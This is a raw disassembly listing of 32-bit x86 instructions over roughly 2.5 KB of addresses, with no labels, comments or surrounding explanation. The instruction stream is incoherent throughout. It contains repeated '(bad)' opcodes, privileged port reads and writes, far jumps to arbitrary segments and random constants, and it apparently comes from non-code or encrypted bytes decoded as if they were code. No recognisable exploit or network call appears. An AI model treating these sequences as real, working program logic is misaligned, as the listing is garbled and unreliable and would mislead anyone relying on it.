  42b66b:	and    BYTE PTR [ebx+0x567e4cad],0x1d
  42b672:	aas    
  42b673:	outs   dx,DWORD PTR ds:[esi]
  42b674:	bound  ecx,QWORD PTR [ecx+edx*1-0x5c]
  42b678:	scas   al,BYTE PTR es:[edi]
  42b679:	xchg   ebx,eax
  42b67a:	popa   
  42b67b:	mov    eax,ds:0xbb31431a
  42b680:	jmp    0x3cf9a0b1
  42b685:	popa   
  42b686:	push   ss
  42b687:	fs je  0x42b6b3
  42b68a:	mov    bl,0x87
  42b68c:	jmp    0x42b6b0
  42b68e:	test   al,0x94
  42b690:	xchg   ebp,eax
  42b691:	add    dh,dh
  42b693:	dec    edx
  42b694:	sub    eax,0xc9b3a888
  42b699:	inc    eax
  42b69a:	ret    
  42b69b:	mov    ebx,0xa857cbb0
  42b6a0:	push   0xffffffa7
  42b6a2:	pop    ss
  42b6a3:	dec    eax
  42b6a4:	xchg   edx,eax
  42b6a6:	(bad)  
  42b6a7:	jmp    0x339f:0x56071cca
  42b6ae:	mov    cl,BYTE PTR [ebp+0x3e]
  42b6b1:	in     al,0xec
  42b6b3:	mov    ebp,0x4b
	...
  42b714:	add    BYTE PTR [eax],al
  42b716:	dec    esi
  42b717:	inc    edx
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp+0x78],bl
  42b723:	out    dx,al
  42b724:	push   ebp
  42b725:	ja     0x42b6f1
  42b727:	rol    BYTE PTR [ecx],1
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR [esi],al
  42b72f:	js     0x42b705
  42b731:	cmp    al,0xdf
  42b733:	neg    DWORD PTR [edi-0x10dff9d8]
  42b739:	sub    BYTE PTR [edx+0x146556b6],dh
  42b73f:	in     al,0x97
  42b741:	test   eax,0x4c53d617
  42b746:	adc    BYTE PTR [ebx+0x752b6e22],dh
  42b74c:	mov    ch,0xc4
  42b74e:	stos   DWORD PTR es:[edi],eax
  42b74f:	sbb    DWORD PTR [edi],esp
  42b751:	sbb    BYTE PTR [edx-0x2c30552c],0xda
  42b758:	test   al,0x1c
  42b75a:	pop    ebx
  42b75b:	into   
  42b75c:	pop    edx
  42b75d:	sbb    edx,edx
  42b75f:	and    DWORD PTR [edx],edx
  42b761:	out    0x2f,al
  42b763:	mov    esi,eax
  42b765:	in     al,dx
  42b766:	call   0x106c:0x9dff8355
  42b76d:	out    0x33,eax
  42b76f:	dec    edx
  42b770:	cmp    eax,0x6da88359
  42b775:	and    esi,DWORD PTR [eax]
  42b777:	sti    
  42b778:	add    DWORD PTR [ecx-0x720bcea1],0xffffffdb
  42b77f:	shr    BYTE PTR ss:[eax-0x3],1
  42b783:	mov    edi,DWORD PTR [eax+0x7683b47a]
  42b789:	rcr    DWORD PTR [ebp-0x7d2a99ed],0x4b
  42b790:	les    esp,FWORD PTR ds:0xddd7c370
  42b796:	mov    ch,0x5c
  42b798:	loopne 0x42b7aa
  42b79a:	icebp  
  42b79b:	cli    
  42b79c:	or     cl,BYTE PTR [edx-0x7d0494fb]
  42b7a2:	sti    
  42b7a3:	xchg   esp,eax
  42b7a4:	jne    0x42b771
  42b7a6:	lahf   
  42b7a7:	inc    ecx
  42b7a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7a9:	pop    edx
  42b7aa:	add    edx,edx
  42b7ac:	mov    DWORD PTR [ecx+esi*8+0x64],esp
  42b7b0:	pop    edx
  42b7b1:	xchg   ebp,eax
  42b7b3:	repnz pop edi
  42b7b5:	mov    gs,WORD PTR [eax+0x43]
  42b7b8:	(bad)  
  42b7b9:	mov    ch,0xa9
  42b7bb:	and    al,0xf7
  42b7bd:	add    al,0xb1
  42b7bf:	push   esp
  42b7c0:	rcr    bl,1
  42b7c2:	(bad)  
  42b7c3:	ficom  WORD PTR [edx-0xf8c75d0]
  42b7c9:	mov    ax,WORD PTR [edi]
  42b7cc:	mov    edi,edx
  42b7ce:	adc    BYTE PTR [edi],0x53
  42b7d1:	(bad)  [ecx+eiz*1+0x4ed4cc5d]
  42b7d8:	adc    bl,BYTE PTR [edx]
  42b7da:	push   ss
  42b7db:	fidivr WORD PTR [ebx+ecx*1]
  42b7de:	inc    edx
  42b7df:	sub    BYTE PTR [esi],ch
  42b7e1:	mov    ah,0x35
  42b7e3:	xor    BYTE PTR [edi],ah
  42b7e5:	mov    al,ds:0x77859117
  42b7ea:	rol    ecx,cl
  42b7ec:	cmp    eax,DWORD PTR [ebx+0x36505875]
  42b7f2:	mov    WORD PTR [ecx+eiz*4-0x79b6919e],cs
  42b7f9:	cmp    BYTE PTR [edi-0x39],bl
  42b7fc:	xchg   BYTE PTR cs:[edi-0x279293c7],dl
  42b803:	add    DWORD PTR [edx],esp
  42b805:	adc    esi,DWORD PTR [ecx-0x34]
  42b808:	cmc    
  42b809:	je     0x42b7c0
  42b80b:	inc    ebp
  42b80c:	jecxz  0x42b867
  42b80e:	idiv   DWORD PTR [esi]
  42b810:	enter  0x2075,0x17
  42b814:	(bad)  
  42b815:	jp     0x42b7bd
  42b817:	sbb    DWORD PTR [edi+0x47b3322],0x40
  42b81e:	dec    edi
  42b81f:	lahf   
  42b820:	mov    ebp,0xfa6a4ef5
  42b825:	dec    eax
  42b826:	(bad)  
  42b827:	test   eax,0xec3766a
  42b82c:	int3   
  42b82d:	jmp    0x574524d3
  42b832:	jecxz  0x42b7cd
  42b834:	adc    DWORD PTR [eax],eax
	...
  42b896:	call   0x2a7738
  42b89b:	out    0xf9,eax
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi-0x3915ea69]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [ecx+0x79af3422],bh
  42b8b3:	fs pop esi
  42b8b5:	jnp    0x42b862
  42b8b7:	inc    edx
  42b8b8:	xchg   esi,eax
  42b8b9:	jge    0x42b8dc
  42b8bb:	xor    DWORD PTR [ebx-0x22],esp
  42b8be:	in     eax,0xa4
  42b8c0:	std    
  42b8c1:	and    edx,ecx
  42b8c3:	(bad)  [eax]
  42b8c5:	push   DWORD PTR [edi+0x3d]
  42b8c8:	mov    edi,0x8931329
  42b8cd:	jmp    0x42b89f
  42b8cf:	fisttp QWORD PTR [esi+0x2e08534e]
  42b8d5:	or     edi,DWORD PTR [edx+0x6d]
  42b8d8:	enter  0xfac,0x38
  42b8dc:	sar    DWORD PTR [edi],cl
  42b8de:	and    eax,0xf6f8d880
  42b8e3:	mov    al,ds:0x60ad7ed4
  42b8e8:	xor    al,0x56
  42b8ea:	mov    esp,0x79748c2
  42b8ef:	inc    esp
  42b8f0:	aaa    
  42b8f1:	xchg   ebx,eax
  42b8f2:	xchg   ebx,eax
  42b8f3:	int3   
  42b8f4:	or     esp,eax
  42b8f6:	ret    0xa620
  42b8f9:	pop    esp
  42b8fa:	mov    edi,0x1f1f0c1a
  42b8ff:	pop    eax
  42b900:	arpl   dx,bx
  42b902:	lock pop ss
  42b904:	mov    ah,0x1
  42b906:	mov    esp,0x4ff12c0
  42b90b:	jae    0x42b8e2
  42b90d:	mov    ebx,ebx
  42b90f:	push   0x1a50eca3
  42b914:	or     BYTE PTR [esi+0x10fbb8ee],0xdb
  42b91b:	adc    eax,0xb66c48b5
  42b920:	ret    0xefdb
  42b923:	xor    DWORD PTR [ebx-0x3f3f135c],ecx
  42b929:	inc    esi
  42b92a:	add    al,0x8d
  42b92c:	sbb    BYTE PTR [edi],ch
  42b92e:	mov    eax,ds:0x62ead70d
  42b933:	or     eax,0x8bba6b1e
  42b938:	push   ds
  42b939:	xchg   esp,eax
  42b93a:	es cdq 
  42b93c:	pop    esi
  42b93d:	dec    eax
  42b93e:	dec    esp
  42b93f:	or     eax,0xab747cef
  42b944:	in     al,0xc8
  42b946:	inc    ecx
  42b947:	mov    eax,ds:0x4d050d6e
  42b94c:	sbb    cl,cl
  42b94e:	xor    esp,DWORD PTR [ebx+0x6b]
  42b951:	mov    dh,0x42
  42b953:	imul   edx,DWORD PTR [ecx],0x3c
  42b956:	dec    esp
  42b957:	mov    ds:0xd9ff91e9,al
  42b95c:	ja     0x42b97d
  42b95e:	int3   
  42b95f:	adc    eax,0xd0bbf529
  42b964:	adc    al,0xc7
  42b966:	inc    eax
  42b967:	inc    ecx
  42b968:	adc    bh,bl
  42b96a:	jp     0x42b951
  42b96c:	popf   
  42b96d:	push   esp
  42b96e:	and    BYTE PTR [ebp+0x30547eb5],0xaa
  42b975:	out    0x78,al
  42b977:	xor    DWORD PTR [edx+eiz*2+0xd],ebx
  42b97b:	popf   
  42b97c:	nop
  42b97d:	mov    ds:0xacc5b912,eax
  42b982:	stos   BYTE PTR es:[edi],al
  42b983:	push   edi
  42b984:	(bad)  
  42b985:	fbstp  TBYTE PTR [ebx-0x13]
  42b988:	ins    DWORD PTR es:[edi],dx
  42b989:	xor    eax,0x913fef62
  42b98e:	pop    ebp
  42b98f:	push   esi
  42b990:	into   
  42b991:	repz xchg ebx,eax
  42b993:	sub    ecx,DWORD PTR [ebx+eax*1+0x45]
  42b997:	mov    DWORD PTR [edi],ebx
  42b999:	or     BYTE PTR [esp+esi*4-0x546d732f],dh
  42b9a0:	push   ebp
  42b9a1:	mov    dl,BYTE PTR [edi+0x53]
  42b9a4:	ins    DWORD PTR es:[edi],dx
  42b9a5:	mov    edi,0x10168b5a
  42b9aa:	xchg   esp,eax
  42b9ab:	cmp    cl,bh
  42b9ad:	xchg   ebp,eax
  42b9ae:	(bad)  
  42b9af:	arpl   WORD PTR [edi+0x2c],ax
  42b9b2:	call   0x439f95
	...
  42ba13:	add    BYTE PTR [eax],al
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fstp   DWORD PTR [edi-0x1c]
  42ba24:	outs   dx,BYTE PTR ds:[esi]
  42ba25:	xlat   BYTE PTR ds:[ebx]
  42ba26:	fcom   st(2)
  42ba28:	add    DWORD PTR [eax],eax
  42ba2a:	pop    es
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [eax+0x62],ch
  42ba30:	pop    edi
  42ba31:	inc    edx
  42ba32:	mov    DWORD PTR ds:0x36360e4b,edi
  42ba38:	jp     0x42baa7
  42ba3a:	mov    ds:0x7e063dd4,al
  42ba3f:	out    dx,al
  42ba40:	icebp  
  42ba41:	nop
  42ba42:	push   cs
  42ba43:	xor    eax,DWORD PTR [eax-0x7e]
  42ba46:	nop
  42ba47:	int    0xff
  42ba49:	add    ah,cl
  42ba4b:	pop    es
  42ba4c:	or     eax,0xd9e68d2f
  42ba51:	neg    DWORD PTR [ebx-0x25]
  42ba54:	dec    edi
  42ba55:	mov    ds:0xf8e7d5f6,eax
  42ba5a:	mov    bh,0x76
  42ba5c:	sub    ch,BYTE PTR [edx-0x5b]
  42ba5f:	dec    eax
  42ba60:	push   esp
  42ba61:	xor    al,0xb0
  42ba63:	and    eax,0xb2099183
  42ba68:	jb     0x42baad
  42ba6a:	stos   BYTE PTR es:[edi],al
  42ba6b:	mov    ah,0x82
  42ba6d:	shr    BYTE PTR [edx-0x14375b87],0x65
  42ba74:	inc    ecx
  42ba75:	addr16 mov ch,0xee
  42ba78:	clc    
  42ba79:	out    dx,al
  42ba7a:	and    DWORD PTR [ebx-0x1b],esp
  42ba7d:	xchg   esp,eax
  42ba7e:	or     al,0x27
  42ba80:	outs   dx,BYTE PTR fs:[esi]
  42ba82:	jmp    DWORD PTR [esi-0x463e90fd]
  42ba88:	sub    bl,cl
  42ba8a:	mov    al,0xed
  42ba8c:	mov    bl,0x45
  42ba8e:	das    
  42ba8f:	push   es
  42ba90:	sbb    al,0x80
  42ba92:	xchg   ebx,eax
  42ba93:	lds    esp,FWORD PTR [eax+ebp*2]
  42ba96:	cmp    ah,BYTE PTR [edi+ebx*4]
  42ba99:	aas    
  42ba9a:	cmp    ecx,edi
  42ba9c:	jbe    0x42ba2e
  42ba9e:	adc    ah,al
  42baa0:	mov    ecx,0xa53549c3
  42baa5:	and    DWORD PTR ds:0x94dfa747,edi
  42baab:	jbe    0x42ba50
  42baad:	inc    edi
  42baae:	mov    dl,0x73
  42bab0:	sti    
  42bab1:	inc    edx
  42bab2:	or     eax,0x9396ab09
  42bab7:	aad    0x7c
  42bab9:	push   esp
  42baba:	pop    ds
  42babb:	sbb    cl,BYTE PTR [ebp-0x2bb0433f]
  42bac1:	dec    edi
  42bac2:	leave  
  42bac3:	popf   
  42bac4:	arpl   WORD PTR [ebp+0x20],si
  42bac7:	mov    DWORD PTR [edi+0x3d],0xf99e1c71
  42bace:	cs retf 0x40d7
  42bad2:	popf   
  42bad3:	inc    ebp
  42bad4:	dec    BYTE PTR [ecx+eiz*4]
  42bad7:	push   esp
  42bad8:	push   ecx
  42bad9:	cli    
  42bada:	lods   al,BYTE PTR ds:[esi]
  42badb:	jns    0x42ba99
  42badd:	mov    edx,ecx
  42badf:	cs mov esp,0xe2567cd2
  42bae5:	fwait
  42bae6:	sub    DWORD PTR [ebx+0x1d],0x6a0588ba
  42baed:	jne    0x42ba7f
  42baef:	cmp    dl,BYTE PTR [ecx]
  42baf1:	addr16 addr16 loopne 0x42bb36
  42baf5:	xchg   ecx,eax
  42baf6:	call   DWORD PTR [ecx-0x333d3aa7]
  42bafc:	outs   dx,BYTE PTR ds:[esi]
  42bafd:	push   eax
  42bafe:	mov    ds:0xf3f4dca6,eax
  42bb03:	add    DWORD PTR [esi+eiz*8],0x457c3a07
  42bb0a:	or     cl,ah
  42bb0c:	sbb    dl,ch
  42bb0e:	test   al,0xab
  42bb10:	mov    ds:0x4b24360d,eax
  42bb15:	mov    BYTE PTR [edi-0x3aa6ad17],dh
  42bb1b:	out    dx,eax
  42bb1c:	cmp    eax,0xf216f81e
  42bb21:	jge    0x42baea
  42bb23:	lods   eax,DWORD PTR ds:[esi]
  42bb24:	sub    al,0xaf
  42bb26:	fincstp 
  42bb28:	and    eax,esp
  42bb2a:	mov    BYTE PTR [ecx],dh
  42bb2c:	adc    eax,0xfa3dc693
  42bb31:	push   ds
  42bb32:	sub    al,0x63
  42bb34:	aam    0x0
	...
  42bb96:	xor    al,0x28
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    edx,DWORD PTR [esi-0x20cd8a44]
  42bba7:	rol    DWORD PTR [ecx],cl
  42bba9:	add    BYTE PTR [edi],al
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    cl,bh
  42bbaf:	leave  
  42bbb0:	rcl    DWORD PTR gs:[ebx+0x7e],cl
  42bbb4:	push   ds
  42bbb5:	call   0x188ee75a
  42bbba:	adc    DWORD PTR [eax+0x50],ecx
  42bbbd:	jbe    0x42bbdb
  42bbbf:	test   BYTE PTR [esi-0x403daf6f],bl
  42bbc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bbc6:	ret    0xae8f
  42bbc9:	out    dx,eax
  42bbca:	scas   al,BYTE PTR es:[edi]
  42bbcb:	inc    eax
  42bbcc:	sahf   
  42bbcd:	ja     0x42bb91
  42bbcf:	mov    cl,0xea
  42bbd1:	or     esp,DWORD PTR [ebp+0x1]
  42bbd4:	out    dx,al
  42bbd5:	in     eax,0x7f
  42bbd7:	lahf   
  42bbd8:	dec    esp
  42bbd9:	xchg   esi,eax
  42bbda:	addr16 dec esi
  42bbdc:	push   ss
  42bbdd:	pop    esi
  42bbde:	xchg   esi,eax
  42bbdf:	rcr    BYTE PTR [esi+0x79],cl
  42bbe2:	retf   
  42bbe3:	jle    0x42bb9a
  42bbe5:	sub    al,0x61
  42bbe7:	xor    BYTE PTR [esi+0x75],cl
  42bbea:	test   BYTE PTR [edi],ch
  42bbec:	repz loope 0x42bb93
  42bbef:	xlat   BYTE PTR ds:[ebx]
  42bbf0:	leave  
  42bbf1:	xchg   edi,eax
  42bbf2:	mov    ds:0x29d0b4f,eax
  42bbf7:	in     eax,dx
  42bbf8:	jmp    0x90e8a617
  42bbfd:	retf   
  42bbfe:	fistp  DWORD PTR [ebp+ebx*2+0x5d]
  42bc02:	pop    ebp
  42bc03:	mov    cl,0xcf
  42bc05:	fcom   DWORD PTR [eax]
  42bc07:	repnz hlt 
  42bc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc0a:	or     esp,ecx
  42bc0c:	(bad)  
  42bc0d:	fsub   QWORD PTR [ebp-0x22]
  42bc10:	es int3 
  42bc12:	push   es
  42bc13:	das    
  42bc14:	jecxz  0x42bc2c
  42bc16:	adc    ah,BYTE PTR [eax]
  42bc18:	xor    ecx,edx
  42bc1a:	test   al,0x34
  42bc1c:	xchg   esp,eax
  42bc1d:	jmp    0x42bbe8
  42bc1f:	ret    0x6c60
  42bc22:	sbb    ecx,DWORD PTR fs:[eax]
  42bc25:	mov    eax,eax
  42bc27:	sub    edx,DWORD PTR [ebx+0x35]
  42bc2a:	lods   al,BYTE PTR ds:[esi]
  42bc2b:	js     0x42bbe7
  42bc2d:	pop    eax
  42bc2e:	push   esi
  42bc2f:	out    0x87,al
  42bc31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc32:	sub    ah,BYTE PTR [esi+eiz*2-0x36bb7b77]
  42bc39:	sub    bh,ah
  42bc3b:	mov    dl,0x27
  42bc3d:	fist   WORD PTR ds:0xe62f58cf
  42bc43:	mov    al,0x44
  42bc45:	div    BYTE PTR [esi]
  42bc47:	mov    dl,0xa7
  42bc49:	jno    0x42bc21
  42bc4b:	(bad)  
  42bc4d:	dec    esi
  42bc4e:	call   0x2fb5:0x6ac26bfe
  42bc55:	adc    dh,BYTE PTR [ebp-0x78]
  42bc58:	or     edi,DWORD PTR [edx+ebx*2-0x79]
  42bc5c:	inc    ebx
  42bc5d:	repnz ror BYTE PTR [ebp+0x6fd53ab5],cl
  42bc64:	std    
  42bc65:	sub    DWORD PTR [ebx],0xf524d95a
  42bc6b:	push   edi
  42bc6c:	xchg   DWORD PTR [ebp+0x6c52cab3],edx
  42bc72:	xchg   bh,cl
  42bc74:	and    eax,0xc29af59
  42bc79:	or     ch,BYTE PTR [edi]
  42bc7b:	fisttp DWORD PTR [ebx+eax*1+0xe]
  42bc7f:	gs popa 
  42bc81:	xchg   edx,eax
  42bc82:	push   ds
  42bc83:	popf   
  42bc84:	sti    
  42bc85:	ss pop eax
  42bc87:	mov    DWORD PTR [edx-0x2903fd49],ebx
  42bc8d:	ficomp WORD PTR ds:0x91ef7c57
  42bc93:	push   ss
  42bc94:	push   esp
  42bc95:	or     DWORD PTR [edx+0x33],ebp
  42bc98:	sub    edi,DWORD PTR [ebx-0x41]
  42bc9b:	out    0x27,al
  42bc9d:	aam    0x3
  42bc9f:	xor    eax,ecx
  42bca1:	out    dx,eax
  42bca2:	imul   ebx,DWORD PTR [ecx+0x73],0x69f932c7
  42bca9:	jg     0x42bcfe
  42bcab:	arpl   WORD PTR [edx-0x40135df6],si
  42bcb1:	int    0xd9
  42bcb3:	sbb    al,0x5f
	...
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	push   ecx
  42bd23:	fsubr  QWORD PTR [edi]
  42bd25:	js     0x42bd0d
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    bh,ch
  42bd2f:	mov    eax,gs:0x2f0b7b09
  42bd35:	scas   eax,DWORD PTR es:[edi]
  42bd36:	imul   ecx,ebx,0xeff07880
  42bd3c:	pop    edi
  42bd3d:	int3   
  42bd3e:	xchg   esi,eax
  42bd3f:	sti    
  42bd40:	imul   ecx,DWORD PTR [ecx-0x681b907f],0xffffffdf
  42bd47:	push   ecx
  42bd48:	xor    dl,bh
  42bd4a:	test   al,0x5f
  42bd4c:	pop    es
  42bd4d:	in     eax,0xe1
  42bd4f:	retf   0xf2f3
  42bd52:	add    edi,DWORD PTR [eax+eax*1-0x63]
  42bd56:	into   
  42bd57:	rol    BYTE PTR [esi+0x5d5b39ce],0x62
  42bd5e:	stos   BYTE PTR es:[edi],al
  42bd5f:	lahf   
  42bd60:	dec    ebx
  42bd61:	das    
  42bd62:	aaa    
  42bd63:	sbb    BYTE PTR [edx-0xa],al
  42bd66:	push   ebp
  42bd67:	(bad)  
  42bd69:	fxch   st(4)
  42bd6b:	aam    0xf9
  42bd6d:	xchg   esi,eax
  42bd6e:	push   0xffffffaf
  42bd70:	test   eax,0x33ede796
  42bd75:	adc    bl,0x60
  42bd78:	std    
  42bd79:	mov    ebx,0x153d0cc
  42bd7e:	lock enter 0x2ae9,0xc3
  42bd83:	loopne 0x42bd1c
  42bd85:	xor    BYTE PTR [edi+0x12e89c27],dh
  42bd8b:	mov    eax,ds:0x24c5ab5a
  42bd90:	out    0xa5,eax
  42bd92:	fstp   QWORD PTR [ecx]
  42bd94:	mov    ecx,gs
  42bd96:	int3   
  42bd97:	dec    ecx
  42bd98:	dec    ecx
  42bd99:	inc    edx
  42bd9a:	leave  
  42bd9b:	cmp    BYTE PTR [eax],dh
  42bd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd9e:	push   eax
  42bd9f:	lods   eax,DWORD PTR ds:[esi]
  42bda0:	outs   dx,BYTE PTR ds:[esi]
  42bda1:	lea    eax,[eax+0x4c3cb748]
  42bda7:	pop    edx
  42bda8:	or     al,0x45
  42bdaa:	cmp    eax,0xd5d9b5d8
  42bdaf:	out    0xfc,eax
  42bdb1:	into   
  42bdb2:	popa   
  42bdb3:	mov    esi,0x32b298f9
  42bdb8:	dec    esp
  42bdb9:	out    0x28,eax
  42bdbb:	mov    esp,0x46111a6a
  42bdc0:	scas   al,BYTE PTR es:[edi]
  42bdc1:	fnstcw WORD PTR [ecx+0x76]
  42bdc4:	sbb    BYTE PTR [esi+0x14356c83],cl
  42bdca:	dec    eax
  42bdcb:	mov    dh,0xf3
  42bdcd:	jmp    0x42bd79
  42bdcf:	push   0x11
  42bdd1:	sub    ecx,ecx
  42bdd3:	sbb    eax,0x5ec5c57c
  42bdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bdd9:	fmul   DWORD PTR [edi+0x8]
  42bddc:	sub    bh,0x38
  42bddf:	jb     0x42be59
  42bde1:	outs   dx,DWORD PTR ds:[esi]
  42bde2:	sbb    al,0x12
  42bde4:	sbb    esp,DWORD PTR [eiz*1-0x57756730]
  42bdeb:	fidivr WORD PTR [esi]
  42bded:	(bad)  [eax-0x54]
  42bdf0:	add    bh,BYTE PTR [ebp-0x59e79028]
  42bdf6:	mov    bh,0xfc
  42bdf8:	dec    edx
  42bdf9:	aas    
  42bdfa:	shr    BYTE PTR [esi+0x1e],0xa4
  42bdfe:	loope  0x42be16
  42be00:	fs loope 0x42be0a
  42be03:	fidiv  DWORD PTR [ebp-0x37]
  42be06:	jl     0x42bdd8
  42be08:	fwait
  42be09:	clc    
  42be0a:	mov    bh,0x72
  42be0c:	push   edi
  42be0d:	mov    esi,0x561c9529
  42be12:	or     al,dh
  42be14:	adc    dl,BYTE PTR [edi+ecx*8-0x41436278]
  42be1b:	rcr    BYTE PTR [edi+0x1e],cl
  42be1e:	jbe    0x42be9c
  42be20:	pop    edi
  42be21:	imul   edi,ecx,0x7e
  42be24:	and    bh,dh
  42be26:	add    DWORD PTR [esi-0xd075061],ebx
  42be2c:	lahf   
  42be2d:	xor    eax,0x65749dd1
  42be32:	pop    esi
  42be33:	xor    eax,0xcc
	...
  42be94:	add    BYTE PTR [eax],al
  42be96:	xchg   edi,eax
  42be97:	and    BYTE PTR [edi-0x26],al
  42be9a:	idiv   edi
  42be9c:	lahf   
  42be9d:	ins    DWORD PTR es:[edi],dx
  42be9e:	jae    0x42bef8
  42bea0:	fcmovnu st,st(5)
  42bea2:	sar    ecx,0xba
  42bea5:	mov    ah,0xed
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [ebx+0x54],bl
  42beb0:	fcmovne st,st(4)
  42beb2:	iret   
  42beb3:	cmp    DWORD PTR [edx+ebp*2],esi
  42beb6:	push   esi
  42beb7:	add    eax,0xa03e02df
  42bebc:	and    eax,0x54646024
  42bec1:	pop    ecx
  42bec2:	into   
  42bec3:	inc    ebp
  42bec4:	inc    ebx
  42bec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bec6:	adc    BYTE PTR [ebx+0x7a855028],ah
  42becc:	(bad)  
  42bece:	scas   al,BYTE PTR es:[edi]
  42becf:	repz sub al,BYTE PTR [edi+0x417da564]
  42bed6:	push   edx
  42bed7:	xchg   edi,eax
  42bed8:	push   0x9e180174
  42bedd:	push   ebp
  42bede:	out    0xb5,al
  42bee0:	jmp    0x42be6d
  42bee2:	or     bl,dh
  42bee4:	and    ebx,edx
  42bee6:	stc    
  42bee7:	loop   0x42bf5e
  42bee9:	test   al,0xe7
  42beeb:	push   esi
  42beec:	cmove  esp,edx
  42beef:	ret    
  42bef0:	repnz nop
  42bef2:	mov    al,0x58
  42bef4:	ror    DWORD PTR [esi-0x6e],0x36
  42bef8:	aam    0xb8
  42befa:	cmp    DWORD PTR [edx+0x61628d5e],0x46
  42bf01:	mov    edx,0xb067ac94
  42bf06:	lock jle 0x42bf26
  42bf09:	sub    al,0xff
  42bf0b:	mov    edi,fs
  42bf0d:	lods   eax,DWORD PTR ds:[esi]
  42bf0e:	jnp    0x42beb1
  42bf10:	jns    0x42befd
  42bf12:	in     al,0x76
  42bf14:	shl    BYTE PTR [edx+0x42e1bae6],1
  42bf1a:	cmp    eax,0x39e13ac4
  42bf1f:	mov    eax,0x3f37e14a
  42bf24:	fcomp  st(1)
  42bf26:	ret    0x22bb
  42bf29:	and    BYTE PTR [edx-0x174d83e3],ah
  42bf2f:	mov    cl,0xcf
  42bf31:	inc    bp
  42bf33:	fadd   st(7),st
  42bf35:	push   edx
  42bf36:	mov    ch,0xab
  42bf38:	test   DWORD PTR [esi+ebx*2-0x244f5ec1],0x53ae614d
  42bf43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf44:	ss dec esp
  42bf46:	sub    BYTE PTR [edi],bh
  42bf48:	shl    BYTE PTR [ebp+0x36],0xcc
  42bf4c:	inc    edi
  42bf4d:	add    BYTE PTR [ebp-0x1f],al
  42bf50:	imul   eax,DWORD PTR [ebx],0xb5973e5f
  42bf56:	mov    ds:0xad0b966f,eax
  42bf5b:	and    al,0x4
  42bf5d:	sbb    DWORD PTR [ecx+0x18],0x30
  42bf61:	mov    ah,0x8d
  42bf63:	pop    ss
  42bf64:	bnd jno 0x42bf20
  42bf67:	test   DWORD PTR [edi-0x6d],edx
  42bf6a:	jge    0x42bf0b
  42bf6c:	(bad)  
  42bf6d:	or     eax,DWORD PTR [ebp+0x1d]
  42bf70:	sbb    eax,0x4d03db8d
  42bf75:	repnz push ecx
  42bf77:	mov    DWORD PTR [ebx-0x50],esp
  42bf7a:	ficomp WORD PTR [ebx]
  42bf7c:	sub    eax,0x7c52c966
  42bf81:	scas   al,BYTE PTR es:[edi]
  42bf82:	inc    edx
  42bf83:	pop    edi
  42bf84:	lea    ebx,[ebx]
  42bf86:	push   ebx
  42bf87:	adc    DWORD PTR [edx],esi
  42bf89:	ror    DWORD PTR ds:0xc5cef61a,0x0
  42bf90:	dec    eax
  42bf91:	shl    DWORD PTR [edx-0x2523f1ba],0x22
  42bf98:	mov    ds:0xb6c6b27a,al
  42bf9d:	sub    BYTE PTR [eax+0x4ae0de38],ah
  42bfa3:	rcr    DWORD PTR [edx],cl
  42bfa5:	mov    bl,0x4b
  42bfa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfa8:	or     DWORD PTR gs:[eax],eax
  42bfab:	push   ecx
  42bfac:	push   ebp
  42bfad:	cmc    
  42bfae:	pop    esi
  42bfaf:	mov    DWORD PTR [ebx],esi
  42bfb1:	test   eax,0x190928
	...
  42c016:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xd92ff806
  42c024:	inc    ebp
  42c025:	outs   dx,BYTE PTR ds:[esi]
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    ah,dl
  42c02f:	sub    BYTE PTR [ecx],dh
  42c031:	(bad)  
  42c032:	mul    ah
  42c034:	retf   
  42c035:	adc    BYTE PTR [ebx-0x43],dl
  42c038:	test   eax,0x4c03c103
  42c03d:	gs mov esp,0x78646b37
  42c043:	push   edi
  42c044:	sbb    eax,0xa0fe6e42
  42c049:	jmp    0xf00d:0x38b963fe
  42c050:	paddusb mm0,QWORD PTR [ebp-0x4f]
  42c054:	repz sbb bh,BYTE PTR [esp+ebp*2-0x79]
  42c059:	cmc    
  42c05a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c05b:	and    eax,0x5de33c7c
  42c060:	lea    esi,[ebp+ebx*8+0x3438e1e3]
  42c067:	test   eax,0x4af6167
